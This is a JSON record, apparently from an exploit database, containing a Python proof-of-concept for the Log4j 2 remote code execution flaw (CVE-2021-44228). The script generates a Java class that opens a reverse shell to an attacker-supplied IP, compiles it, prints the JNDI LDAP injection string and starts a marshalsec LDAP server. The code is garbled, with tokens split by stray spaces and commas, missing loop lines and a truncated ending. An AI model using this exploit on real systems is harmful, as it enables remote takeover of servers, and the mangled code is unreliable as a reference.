{
    "text": "vul_name : Apache Log4j 2 Remote Code Execution ( Py )  ， vul_cve : CVE-2021-44228 ， vul_poc :  # Exploit Title : Apache Log4j 2 - Remote Code Execution ( RCE )  ，  # Date : 11/12/2021 ，  # Exploit Authors : kozmer , z9fr , svmorris ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : versions 2.0-beta-9 and 2.14.1. ，  # Tested on : Linux ，  # CVE : CVE-2021-44228 ，  # Github repo :  ， javaver = subprocess.call (  [ './jdk1.8.0_20/bin/java' , '-version' ]  )  # stderr=subprocess.DEVNULL , stdout=subprocess.DEVNULL )  ， print ( \"\\n\" )  ， userip = input ( \" [ + ] Enter IP for LDAPRefServer & Shell : \" )  ， userport = input ( \" [ + ] Enter listener port for LDAPRefServer : \" )  ， lport = input ( \" [ + ] Set listener port for shell : \" )  ， javapayload = ( \" ， public class Exploit { ， public Exploit (  ) throws Exception { ， String host=\"%s\" ;  ， int port=%s ;  ， String cmd=\"/bin/sh\" ;  ， Process p=new ProcessBuilder ( cmd ) .redirectErrorStream ( true ) .start (  )  ;  ， Socket s=new Socket ( host , port )  ;  ， InputStream pi=p.getInputStream (  )  , pe=p.getErrorStream (  )  , si=s.getInputStream (  )  ;  ， OutputStream po=p.getOutputStream (  )  , so=s.getOutputStream (  )  ;  ， so.write ( pi.read (  )  ;  ， so.write ( pe.read (  )  ;  ， po.write ( si.read (  )  ;  ， so.flush (  )  ;  ， po.flush (  )  ;  ， Thread.sleep ( 50 )  ;  ， p.exitValue (  )  ;  ， } ， catch ( Exception e ) { ， } ， } ;  ， p.destroy (  )  ;  ， s.close (  )  ;  ， } ， } ， \" ) % ( userip , lport )  ， f = open ( \"Exploit.java\" , \"w\" )  ， f.write ( javapayload )  ， f.close (  )  ， os.system ( './jdk1.8.0_20/bin/javac Exploit.java' )  ， sendme = ( \" $ {jndi : ldap : /%s : 1389/a}\" ) % ( userip )  ， print ( \" [ + ] Send me : \"+sendme+\"\\n\" )  ， os.system ( \"./jdk1.8.0_20/bin/java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer ，  ( userip , userport )  ， payload (  )  ， marshalsec (  ) ",
    "time": "2021.12.14"
}